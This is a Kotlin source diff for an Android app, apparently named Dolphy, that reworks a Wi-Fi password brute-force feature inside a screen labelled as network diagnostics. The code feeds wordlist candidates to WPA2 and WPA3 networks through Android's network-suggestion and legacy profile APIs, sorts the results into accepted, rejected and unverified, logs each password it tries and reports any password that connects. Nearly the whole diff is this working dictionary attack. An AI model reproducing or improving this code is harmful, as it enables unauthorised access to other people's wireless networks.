@@ -154,6 +154,8 @@ import kotlinx.coroutines.coroutineScope
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
+import kotlinx.coroutines.sync.Mutex
+import kotlinx.coroutines.sync.withLock
 import kotlinx.coroutines.withContext
 import kotlinx.coroutines.yield
 
@@ -228,7 +230,7 @@ private class PasswordGroup(
     val passwords = mutableListOf<String>()
     val isImported: Boolean get() = sourceFile != null || name != STOCK_GROUP_NAME
     val count: Int get() = if (sourceFile == null) passwords.size else fileCount
-    val validCount: Int get() = if (sourceFile == null) passwords.count { it.length >= 8 } else fileValidCount
+    val validCount: Int get() = if (sourceFile == null) passwords.count(::isSupportedWpaPassphrase) else fileValidCount
 
     fun openCursor(context: android.content.Context): PasswordCursor {
         return if (sourceFile == null) ListPasswordCursor(passwords)
@@ -306,9 +308,11 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
     var launchedWifiSettings by remember { mutableStateOf(false) }
     var udpSendJob by remember { mutableStateOf<kotlinx.coroutines.Job?>(null) }
     var bruteForceJob by remember { mutableStateOf<kotlinx.coroutines.Job?>(null) }
+    val wifiBruteMutex = remember { Mutex() }
     val sendLogs = remember { mutableStateListOf<String>() }
 
     var bruteForceSuccess by remember { mutableStateOf(false) }
+    var bruteForceNeedsUserAction by remember { mutableStateOf(false) }
     var foundPassword by remember { mutableStateOf("") }
 
     var currentBrutePassword by remember { mutableStateOf("") }
@@ -1023,42 +1027,66 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
         bruteForceJob?.cancel()
         sendLogs.clear()
         dialogStage = HubDialogStage.BruteForce
+        bruteForceSuccess = false
+        bruteForceNeedsUserAction = false
+        foundPassword = ""
+        currentBrutePassword = ""
         val selectedGroups = passwordGroups.filter { it.selected }
         val totalCandidates = selectedGroups.sumOf { it.validCount.toLong() }
-        val targetSsid = network.ssid.trim('"')
+        val targetSsid = network.ssid
+        val security = detectWifiPersonalSecurity(network.capabilities)
         appendLog("Starting Brute Force: $targetSsid")
         appendLog("Groups: ${selectedGroups.joinToString { it.name }}")
-        appendLog("Password candidates: $totalCandidates (entries < 8 chars are skipped)")
+        appendLog("Password candidates: $totalCandidates (unsupported WPA entries are skipped)")
+        appendLog("Target: ${security.name} · BSSID ${network.bssid ?: "tersedia dari SSID"}")
         if (selectedGroups.isEmpty() || totalCandidates == 0L) {
-            appendLog("Select a wordlist containing at least one password of 8 characters or more.")
+            appendLog("Select a wordlist containing at least one valid WPA password.")
+            return
+        }
+        if (security == WifiPersonalSecurity.UNSUPPORTED) {
+            appendLog("This security mode is not a supported WPA2/WPA3 personal network.")
+            return
+        }
+        if (security == WifiPersonalSecurity.WPA3 && Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+            appendLog("WPA3-SAE testing requires Android 11 or newer.")
             return
         }
 
         bruteForceJob = scope.launch(Dispatchers.IO) {
+            wifiBruteMutex.withLock {
             var attempted = 0L
+            var rejected = 0L
+            var unverified = 0L
             var found = false
             var failed = false
+            var needsUserAction = false
             try {
                 withContext(Dispatchers.Main) {
-                    appendLog("Preparing radio (leave target / clear old suggestions)...")
+                    appendLog("Preparing radio and removing old Dolphy suggestions...")
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                        appendLog("If Android asks to approve network suggestions, allow Dolphy.")
+                    }
                 }
                 prepareRadioForBrute(wifiManager, targetSsid)
 
-                if (isFullyConnectedToSsid(wifiManager, targetSsid)) {
+                val activeSsid = currentCompletedWifiSsid(wifiManager)
+                if (activeSsid != null) {
+                    needsUserAction = true
                     withContext(Dispatchers.Main) {
-                        appendLog("Still on $targetSsid. Disconnect from this network in system Wi-Fi and retry.")
-                        appendLog("Scan finished.")
+                        bruteForceNeedsUserAction = true
+                        appendLog("Wi-Fi $activeSsid is still connected. Disconnect it in system Wi-Fi settings, then retry.")
+                        appendLog("No password was tested; Android 10+ does not let this app disconnect saved Wi-Fi.")
                     }
                     return@launch
                 }
 
                 for (group in selectedGroups) {
-                    if (!isActive || found) break
+                    if (!isActive || found || failed || needsUserAction) break
                     val cursor = group.openCursor(context)
                     try {
-                        while (isActive && !found) {
+                        while (isActive && !found && !failed && !needsUserAction) {
                             val password = cursor.nextPassword() ?: break
-                            if (password.length < 8) continue
+                            if (!isSupportedWpaPassphrase(password)) continue
                             attempted++
 
                             withContext(Dispatchers.Main) {
@@ -1066,27 +1094,56 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
                                 appendLog("[$attempted/$totalCandidates] Testing: $password")
                             }
 
-                            val result = testWifiPassword(context, wifiManager, targetSsid, password)
+                            val result = testWifiPassword(context, wifiManager, network, password)
                             if (!isActive) break
 
-                            if (result) {
-                                found = true
-                                withContext(Dispatchers.Main) {
-                                    currentBrutePassword = password
-                                    appendLog("SUCCESS! Password found: $password")
-                                    foundPassword = password
-                                    bruteForceSuccess = true
-                                    com.droid.dolphy.trackWifiBruteSuccess(context)
-                                    haptics.performHapticFeedback(
-                                        androidx.compose.ui.hapticfeedback.HapticFeedbackType.LongPress,
-                                    )
+                            when (result.outcome) {
+                                WifiAttemptOutcome.SUCCESS -> {
+                                    found = true
+                                    withContext(Dispatchers.Main) {
+                                        currentBrutePassword = password
+                                        appendLog("SUCCESS! Android confirmed this suggestion: $password")
+                                        foundPassword = password
+                                        bruteForceSuccess = true
+                                        com.droid.dolphy.trackWifiBruteSuccess(context)
+                                        haptics.performHapticFeedback(
+                                            androidx.compose.ui.hapticfeedback.HapticFeedbackType.LongPress,
+                                        )
+                                    }
                                 }
-                            } else {
-                                withContext(Dispatchers.Main) {
-                                    appendLog("Failed: $password")
+
+                                WifiAttemptOutcome.REJECTED -> {
+                                    rejected++
+                                    withContext(Dispatchers.Main) {
+                                        appendLog("Rejected by authentication: $password")
+                                    }
                                 }
-                                settleAfterFailedAttempt(wifiManager, targetSsid)
+
+                                WifiAttemptOutcome.INCONCLUSIVE -> {
+                                    unverified++
+                                    withContext(Dispatchers.Main) {
+                                        appendLog("Not verified: $password · ${result.detail}")
+                                    }
+                                    if (unverified >= 2) {
+                                        needsUserAction = true
+                                        withContext(Dispatchers.Main) {
+                                            bruteForceNeedsUserAction = true
+                                            appendLog("Paused instead of labeling unverified passwords as wrong.")
+                                            appendLog("Disconnect other Wi-Fi, approve Dolphy suggestions, then retry.")
+                                        }
+                                    }
+                                }
+
+                                WifiAttemptOutcome.UNSUPPORTED,
+                                WifiAttemptOutcome.ERROR,
+                                -> {
+                                    failed = true
+                                    withContext(Dispatchers.Main) {
+                                        appendLog("Cannot test $password: ${result.detail}")
+                                    }
+                                }
                             }
+                            if (!found) settleAfterFailedAttempt(wifiManager, targetSsid)
                         }
                     } finally {
                         runCatching { cursor.close() }
@@ -1102,8 +1159,14 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
             }
             if (isActive) {
                 withContext(Dispatchers.Main) {
-                    appendLog(if (failed) "Scan stopped after an error." else "Scan finished.")
+                    when {
+                        found -> appendLog("Scan finished with a confirmed password.")
+                        needsUserAction -> appendLog("Scan paused; no unverified entry was marked as failed.")
+                        failed -> appendLog("Scan stopped after an API or wordlist error.")
+                        else -> appendLog("Scan finished. Rejected: $rejected · unverified: $unverified")
+                    }
                 }
+            }
             }
         }
     }
@@ -1121,6 +1184,7 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
         launchedWifiSettings = false
         sendLogs.clear()
         bruteForceSuccess = false
+        bruteForceNeedsUserAction = false
         foundPassword = ""
         selectedTargetLabel = ""
         lanHosts.clear()
@@ -1748,6 +1812,29 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
                                     }
                                 }
                             }
+                            if (currentDialogStage == HubDialogStage.BruteForce && bruteForceNeedsUserAction) {
+                                Text(
+                                    text = "Android belum memverifikasi kandidat. Putuskan Wi-Fi lain dan izinkan suggestion Dolphy; timeout bukan berarti kata sandi salah.",
+                                    style = MaterialTheme.typography.bodySmall,
+                                    color = MaterialTheme.colorScheme.onSurfaceVariant,
+                                )
+                                com.droid.dolphy.AccentButton(
+                                    onClick = {
+                                        runCatching {
+                                            context.startActivity(Intent(Settings.ACTION_WIFI_SETTINGS))
+                                        }
+                                    },
+                                    modifier = Modifier.fillMaxWidth(),
+                                ) {
+                                    Text("Buka Setelan Wi-Fi")
+                                }
+                                com.droid.dolphy.DolphyTextButton(
+                                    onClick = { startWifiBruteForce(currentDialogNetwork) },
+                                    modifier = Modifier.fillMaxWidth(),
+                                ) {
+                                    Text("Coba lagi dari awal")
+                                }
+                            }
                             com.droid.dolphy.AccentButton(
                                 onClick = { closeDialog() },
                                 modifier = Modifier.fillMaxWidth(),
@@ -1943,15 +2030,29 @@ fun NetworkDiagnosticHubScreen(navController: NavController) {
     }
 }
 
-private fun currentWifiSsid(wifiManager: WifiManager): String? {
+private enum class WifiAttemptOutcome {
+    SUCCESS,
+    REJECTED,
+    INCONCLUSIVE,
+    UNSUPPORTED,
+    ERROR,
+}
+
+private data class WifiAttemptResult(
+    val outcome: WifiAttemptOutcome,
+    val detail: String,
+)
+
+private fun currentCompletedWifiSsid(wifiManager: WifiManager): String? {
     return try {
-        val raw = wifiManager.connectionInfo?.ssid?.trim('"').orEmpty()
+        val info = wifiManager.connectionInfo ?: return null
+        if (info.supplicantState != SupplicantState.COMPLETED) return null
+        val raw = info.ssid?.trim('"').orEmpty()
         if (raw.isEmpty() || raw == "<unknown ssid>") null else raw
     } catch (_: Exception) {
         null
     }
 }
-
 
 private fun isFullyConnectedToSsid(wifiManager: WifiManager, cleanSsid: String): Boolean {
     return try {
@@ -1963,7 +2064,6 @@ private fun isFullyConnectedToSsid(wifiManager: WifiManager, cleanSsid: String):
         false
     }
 }
-
 
 private fun isBusyOnSsid(wifiManager: WifiManager, cleanSsid: String): Boolean {
     return try {
@@ -1985,102 +2085,140 @@ private fun isBusyOnSsid(wifiManager: WifiManager, cleanSsid: String): Boolean {
     }
 }
 
+@androidx.annotation.RequiresApi(Build.VERSION_CODES.Q)
+private fun removeWifiSuggestions(wifiManager: WifiManager, suggestions: List<WifiNetworkSuggestion>) {
+    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return
+    runCatching {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            wifiManager.removeNetworkSuggestions(
+                suggestions,
+                WifiManager.ACTION_REMOVE_SUGGESTION_DISCONNECT,
+            )
+        } else {
+            wifiManager.removeNetworkSuggestions(suggestions)
+        }
+    }
+}
+
 private fun clearAppWifiSuggestions(wifiManager: WifiManager) {
     if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return
-    runCatching { wifiManager.removeNetworkSuggestions(emptyList()) }
+    removeWifiSuggestions(wifiManager, emptyList())
+}
+
+private fun waitForNoCompletedConnection(wifiManager: WifiManager, timeoutMs: Long) {
+    val deadline = System.currentTimeMillis() + timeoutMs
+    while (System.currentTimeMillis() < deadline) {
+        if (currentCompletedWifiSsid(wifiManager) == null) return
+        Thread.sleep(200)
+    }
 }
 
 private fun prepareRadioForBrute(wifiManager: WifiManager, cleanSsid: String) {
     clearAppWifiSuggestions(wifiManager)
-    if (isBusyOnSsid(wifiManager, cleanSsid)) {
+    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
+        @Suppress("DEPRECATION")
         runCatching { wifiManager.disconnect() }
+        waitUntilLeftTarget(wifiManager, cleanSsid, timeoutMs = 8_000)
+    } else {
+        // disconnect() always returns false for apps targeting Android 10+.
+        // Removing our own suggestion with DISCONNECT is the only public cleanup
+        // available here; a saved Wi-Fi connection requires user action.
+        waitForNoCompletedConnection(wifiManager, timeoutMs = 3_000)
     }
-    waitUntilLeftTarget(wifiManager, cleanSsid, timeoutMs = 8_000)
-    Thread.sleep(800)
+    Thread.sleep(500)
 }
 
 private fun settleAfterFailedAttempt(wifiManager: WifiManager, cleanSsid: String) {
     clearAppWifiSuggestions(wifiManager)
-    if (isBusyOnSsid(wifiManager, cleanSsid)) {
+    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
+        @Suppress("DEPRECATION")
         runCatching { wifiManager.disconnect() }
+        waitUntilLeftTarget(wifiManager, cleanSsid, timeoutMs = 8_000)
+        Thread.sleep(800)
+    } else {
+        waitForNoCompletedConnection(wifiManager, timeoutMs = 1_500)
+        Thread.sleep(400)
     }
-    waitUntilLeftTarget(wifiManager, cleanSsid, timeoutMs = 10_000)
-    Thread.sleep(1_200)
 }
 
 private fun waitUntilLeftTarget(wifiManager: WifiManager, cleanSsid: String, timeoutMs: Long) {
     val deadline = System.currentTimeMillis() + timeoutMs
     while (System.currentTimeMillis() < deadline) {
         if (!isBusyOnSsid(wifiManager, cleanSsid) && !isFullyConnectedToSsid(wifiManager, cleanSsid)) {
-            Thread.sleep(400)
+            Thread.sleep(300)
             if (!isBusyOnSsid(wifiManager, cleanSsid)) return
         }
-        Thread.sleep(300)
+        Thread.sleep(250)
     }
-}
-
-private fun waitForStableConnection(
-    wifiManager: WifiManager,
-    cleanSsid: String,
-    timeoutMs: Long,
-    stableMs: Long = 1_500,
-): Boolean {
-    val deadline = System.currentTimeMillis() + timeoutMs
-    var stableSince = -1L
-    while (System.currentTimeMillis() < deadline) {
-        if (isFullyConnectedToSsid(wifiManager, cleanSsid)) {
-            if (stableSince < 0) stableSince = System.currentTimeMillis()
-            if (System.currentTimeMillis() - stableSince >= stableMs) {
-                return true
-            }
-        } else {
-            stableSince = -1L
-        }
-        Thread.sleep(300)
-    }
-    return false
 }
 
 private fun testWifiPassword(
     context: Context,
     wifiManager: WifiManager,
-    ssid: String,
+    network: HubWifiNetwork,
     password: String,
-): Boolean {
-    val cleanSsid = ssid.trim('"')
+): WifiAttemptResult {
+    val cleanSsid = network.ssid
     if (isBusyOnSsid(wifiManager, cleanSsid)) {
         settleAfterFailedAttempt(wifiManager, cleanSsid)
     }
-    if (isFullyConnectedToSsid(wifiManager, cleanSsid)) {
-        return false
+    val activeSsid = currentCompletedWifiSsid(wifiManager)
+    if (activeSsid != null) {
+        return WifiAttemptResult(
+            WifiAttemptOutcome.INCONCLUSIVE,
+            "Wi-Fi $activeSsid is still connected; Android did not isolate the candidate",
+        )
     }
     return when {
         Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q ->
-            testPasswordViaSuggestion(context, wifiManager, cleanSsid, password)
+            testPasswordViaSuggestion(context, wifiManager, network, password)
         else ->
-            testPasswordLegacy(wifiManager, cleanSsid, password)
+            testPasswordLegacy(wifiManager, network, password)
     }
 }
 
-private fun testPasswordLegacy(wifiManager: WifiManager, cleanSsid: String, password: String): Boolean {
+private fun testPasswordLegacy(
+    wifiManager: WifiManager,
+    network: HubWifiNetwork,
+    password: String,
+): WifiAttemptResult {
+    if (detectWifiPersonalSecurity(network.capabilities) != WifiPersonalSecurity.WPA2) {
+        return WifiAttemptResult(
+            WifiAttemptOutcome.UNSUPPORTED,
+            "Only WPA2-PSK is supported by the legacy Android profile API",
+        )
+    }
+    val cleanSsid = network.ssid
     var netId = -1
-    var ok = false
+    var success = false
     return try {
         @Suppress("DEPRECATION")
         val wifiConfig = android.net.wifi.WifiConfiguration().apply {
-            SSID = "\"" + cleanSsid + "\""
-            preSharedKey = "\"" + password + "\""
+            SSID = quoteLegacyWifiValue(cleanSsid)
+            preSharedKey = quoteLegacyWifiValue(password)
+            BSSID = network.bssid
+            allowedAuthAlgorithms.set(android.net.wifi.WifiConfiguration.AuthAlgorithm.OPEN)
             allowedKeyManagement.set(android.net.wifi.WifiConfiguration.KeyMgmt.WPA_PSK)
+            allowedProtocols.set(android.net.wifi.WifiConfiguration.Protocol.WPA)
+            allowedProtocols.set(android.net.wifi.WifiConfiguration.Protocol.RSN)
+            allowedPairwiseCiphers.set(android.net.wifi.WifiConfiguration.PairwiseCipher.TKIP)
+            allowedPairwiseCiphers.set(android.net.wifi.WifiConfiguration.PairwiseCipher.CCMP)
+            allowedGroupCiphers.set(android.net.wifi.WifiConfiguration.GroupCipher.TKIP)
+            allowedGroupCiphers.set(android.net.wifi.WifiConfiguration.GroupCipher.CCMP)
             status = android.net.wifi.WifiConfiguration.Status.ENABLED
         }
         @Suppress("DEPRECATION")
         netId = wifiManager.addNetwork(wifiConfig)
-        if (netId == -1) return false
+        if (netId == -1) {
+            return WifiAttemptResult(WifiAttemptOutcome.ERROR, "Android rejected the legacy Wi-Fi profile")
+        }
         @Suppress("DEPRECATION")
         wifiManager.disconnect()
-        Thread.sleep(500)
+        Thread.sleep(400)
         @Suppress("DEPRECATION")
-        if (!wifiManager.enableNetwork(netId, true)) return false
+        if (!wifiManager.enableNetwork(netId, true)) {
+            return WifiAttemptResult(WifiAttemptOutcome.ERROR, "Android could not enable the test profile")
+        }
         @Suppress("DEPRECATION")
         wifiManager.reconnect()
         val deadline = System.currentTimeMillis() + 18_000
@@ -2094,92 +2232,215 @@ private fun testPasswordLegacy(wifiManager: WifiManager, cleanSsid: String, pass
             if (good) {
                 if (stableSince < 0) stableSince = System.currentTimeMillis()
                 if (System.currentTimeMillis() - stableSince >= 1_500) {
-                    ok = true
-                    break
+                    success = true
+                    return WifiAttemptResult(WifiAttemptOutcome.SUCCESS, "Legacy profile connected")
                 }
             } else {
                 stableSince = -1L
             }
-            Thread.sleep(300)
+            Thread.sleep(250)
         }
-        ok
-    } catch (_: Exception) {
-        false
+        WifiAttemptResult(
+            WifiAttemptOutcome.INCONCLUSIVE,
+            "The forced legacy profile did not reach a stable connection within 18 seconds",
+        )
+    } catch (e: Exception) {
+        WifiAttemptResult(WifiAttemptOutcome.ERROR, e.message ?: e.javaClass.simpleName)
     } finally {
-        if (netId != -1 && !ok) {
+        if (netId != -1 && !success) {
             runCatching {
                 @Suppress("DEPRECATION")
                 wifiManager.removeNetwork(netId)
                 @Suppress("DEPRECATION")
                 wifiManager.saveConfiguration()
             }
+            @Suppress("DEPRECATION")
             runCatching { wifiManager.disconnect() }
         }
     }
+}
+
+@androidx.annotation.RequiresApi(Build.VERSION_CODES.R)
+private fun registerSuggestionFailureListener(
+    context: Context,
+    wifiManager: WifiManager,
+    attemptSuggestion: WifiNetworkSuggestion,
+    failureReason: java.util.concurrent.atomic.AtomicReference<Int?>,
+): WifiManager.SuggestionConnectionStatusListener? {
+    val listener = WifiManager.SuggestionConnectionStatusListener { failedSuggestion, reason ->
+        if (failedSuggestion == attemptSuggestion) failureReason.set(reason)
+    }
+    return runCatching {
+        wifiManager.addSuggestionConnectionStatusListener(
+            ContextCompat.getMainExecutor(context),
+            listener,
+        )
+        listener
+    }.getOrNull()
+}
+
+@androidx.annotation.RequiresApi(Build.VERSION_CODES.R)
+private fun unregisterSuggestionFailureListener(wifiManager: WifiManager, listener: Any?) {
+    val typedListener = listener as? WifiManager.SuggestionConnectionStatusListener ?: return
+    runCatching { wifiManager.removeSuggestionConnectionStatusListener(typedListener) }
 }
 
 @androidx.annotation.RequiresApi(Build.VERSION_CODES.Q)
 private fun testPasswordViaSuggestion(
     context: Context,
     wifiManager: WifiManager,
-    cleanSsid: String,
+    network: HubWifiNetwork,
     password: String,
-): Boolean {
+): WifiAttemptResult {
+    val cleanSsid = network.ssid
+    val security = detectWifiPersonalSecurity(network.capabilities)
+    if (security == WifiPersonalSecurity.UNSUPPORTED) {
+        return WifiAttemptResult(WifiAttemptOutcome.UNSUPPORTED, "Unsupported Wi-Fi security mode")
+    }
+    if (security == WifiPersonalSecurity.WPA3 && Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+        return WifiAttemptResult(WifiAttemptOutcome.UNSUPPORTED, "WPA3-SAE requires Android 11+")
+    }
+
     var suggestion: WifiNetworkSuggestion? = null
+    var receiver: android.content.BroadcastReceiver? = null
+    var receiverRegistered = false
+    var connectionListener: Any? = null
+    var listenerRegistered = false
     var success = false
-    val connectivityManager =
-        context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
-    var callback: ConnectivityManager.NetworkCallback? = null
+    val connected = java.util.concurrent.atomic.AtomicBoolean(false)
+    val failureReason = java.util.concurrent.atomic.AtomicReference<Int?>(null)
+
     return try {
         clearAppWifiSuggestions(wifiManager)
-        Thread.sleep(400)
-        if (isBusyOnSsid(wifiManager, cleanSsid)) {
-            runCatching { wifiManager.disconnect() }
-            waitUntilLeftTarget(wifiManager, cleanSsid, 8_000)
+        Thread.sleep(300)
+        val activeSsid = currentCompletedWifiSsid(wifiManager)
+        if (activeSsid != null) {
+            return WifiAttemptResult(
+                WifiAttemptOutcome.INCONCLUSIVE,
+                "Wi-Fi $activeSsid is still connected; disconnect it in system settings",
+            )
         }
-        if (isFullyConnectedToSsid(wifiManager, cleanSsid)) {
-            return false
-        }
+
         val builder = WifiNetworkSuggestion.Builder()
             .setSsid(cleanSsid)
-            .setWpa2Passphrase(password)
             .setIsAppInteractionRequired(false)
+        network.bssid?.let { bssid ->
+            runCatching { builder.setBssid(android.net.MacAddress.fromString(bssid)) }
+        }
+        when (security) {
+            WifiPersonalSecurity.WPA2 -> builder.setWpa2Passphrase(password)
+            WifiPersonalSecurity.WPA3 -> {
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                    builder.setWpa3Passphrase(password)
+                }
+            }
+            WifiPersonalSecurity.UNSUPPORTED -> Unit
+        }
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             builder.setPriority(Int.MAX_VALUE)
         }
-        suggestion = builder.build()
-        val addStatus = wifiManager.addNetworkSuggestions(listOf(suggestion!!))
-        if (addStatus != WifiManager.STATUS_NETWORK_SUGGESTIONS_SUCCESS) {
-            return false
+        val attemptSuggestion = builder.build()
+        suggestion = attemptSuggestion
+
+        val attemptReceiver = object : android.content.BroadcastReceiver() {
+            override fun onReceive(receiverContext: Context?, intent: Intent?) {
+                if (intent?.action != WifiManager.ACTION_WIFI_NETWORK_SUGGESTION_POST_CONNECTION) return
+                val connectedSuggestion: WifiNetworkSuggestion? = if (Build.VERSION.SDK_INT >= 33) {
+                    intent.getParcelableExtra(
+                        WifiManager.EXTRA_NETWORK_SUGGESTION,
+                        WifiNetworkSuggestion::class.java,
+                    )
+                } else {
+                    @Suppress("DEPRECATION")
+                    intent.getParcelableExtra(WifiManager.EXTRA_NETWORK_SUGGESTION)
+                }
+                val passphraseMatches = Build.VERSION.SDK_INT < Build.VERSION_CODES.R ||
+                    connectedSuggestion?.passphrase == password
+                if (connectedSuggestion == attemptSuggestion && passphraseMatches) {
+                    connected.set(true)
+                }
+            }
         }
-        callback = object : ConnectivityManager.NetworkCallback() {}
-        val request = NetworkRequest.Builder()
-            .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
-            .build()
-        runCatching { connectivityManager.registerNetworkCallback(request, callback!!) }
-        success = waitForStableConnection(
-            wifiManager = wifiManager,
-            cleanSsid = cleanSsid,
-            timeoutMs = 20_000,
-            stableMs = 1_500,
+        receiver = attemptReceiver
+        ContextCompat.registerReceiver(
+            context,
+            attemptReceiver,
+            android.content.IntentFilter(WifiManager.ACTION_WIFI_NETWORK_SUGGESTION_POST_CONNECTION),
+            ContextCompat.RECEIVER_NOT_EXPORTED,
         )
-        success
-    } catch (_: Exception) {
-        false
-    } finally {
-        callback?.let { cb ->
-            runCatching { connectivityManager.unregisterNetworkCallback(cb) }
-        }
-        if (!success) {
-            suggestion?.let { s ->
-                runCatching { wifiManager.removeNetworkSuggestions(listOf(s)) }
-            }
-            clearAppWifiSuggestions(wifiManager)
-            if (isBusyOnSsid(wifiManager, cleanSsid)) {
-                runCatching { wifiManager.disconnect() }
-            }
+        receiverRegistered = true
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            connectionListener = registerSuggestionFailureListener(
+                context = context,
+                wifiManager = wifiManager,
+                attemptSuggestion = attemptSuggestion,
+                failureReason = failureReason,
+            )
+            listenerRegistered = connectionListener != null
         }
 
+        val addStatus = wifiManager.addNetworkSuggestions(listOf(attemptSuggestion))
+        if (addStatus != WifiManager.STATUS_NETWORK_SUGGESTIONS_SUCCESS) {
+            return WifiAttemptResult(
+                WifiAttemptOutcome.INCONCLUSIVE,
+                "Android did not accept the suggestion (status $addStatus); check Dolphy approval",
+            )
+        }
+        @Suppress("DEPRECATION")
+        runCatching { wifiManager.startScan() }
+
+        val deadline = System.currentTimeMillis() + 20_000
+        while (System.currentTimeMillis() < deadline) {
+            if (connected.get()) {
+                success = true
+                return WifiAttemptResult(
+                    WifiAttemptOutcome.SUCCESS,
+                    "Android confirmed the exact suggestion connection",
+                )
+            }
+            failureReason.get()?.let { reason ->
+                return when (reason) {
+                    WifiManager.STATUS_SUGGESTION_CONNECTION_FAILURE_AUTHENTICATION ->
+                        WifiAttemptResult(
+                            WifiAttemptOutcome.REJECTED,
+                            "Android reported authentication failure",
+                        )
+                    WifiManager.STATUS_SUGGESTION_CONNECTION_FAILURE_ASSOCIATION ->
+                        WifiAttemptResult(
+                            WifiAttemptOutcome.INCONCLUSIVE,
+                            "Association failed; check signal, band, BSSID, and security mode",
+                        )
+                    WifiManager.STATUS_SUGGESTION_CONNECTION_FAILURE_IP_PROVISIONING ->
+                        WifiAttemptResult(
+                            WifiAttemptOutcome.INCONCLUSIVE,
+                            "IP/DHCP provisioning failed; this is not proof of a wrong password",
+                        )
+                    else ->
+                        WifiAttemptResult(
+                            WifiAttemptOutcome.INCONCLUSIVE,
+                            "Android reported an unknown suggestion connection failure",
+                        )
+                }
+            }
+            Thread.sleep(200)
+        }
+        WifiAttemptResult(
+            WifiAttemptOutcome.INCONCLUSIVE,
+            "No exact suggestion confirmation within 20 seconds; timeout is not a wrong-password result",
+        )
+    } catch (e: Exception) {
+        WifiAttemptResult(WifiAttemptOutcome.ERROR, e.message ?: e.javaClass.simpleName)
+    } finally {
+        if (listenerRegistered && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            unregisterSuggestionFailureListener(wifiManager, connectionListener)
+        }
+        if (receiverRegistered) {
+            receiver?.let { runCatching { context.unregisterReceiver(it) } }
+        }
+        if (!success) {
+            suggestion?.let { removeWifiSuggestions(wifiManager, listOf(it)) }
+        }
     }
 }
 
@@ -2265,7 +2526,7 @@ private fun BrutePasswordDialog(
                     )
                 }
                 Text(
-                    text = "Satu kata sandi per baris · disimpan privat di aplikasi",
+                    text = "Satu sandi per baris · spasi dipertahankan · disimpan privat",
                     style = MaterialTheme.typography.labelSmall,
                     color = MaterialTheme.colorScheme.onSurfaceVariant,
                 )
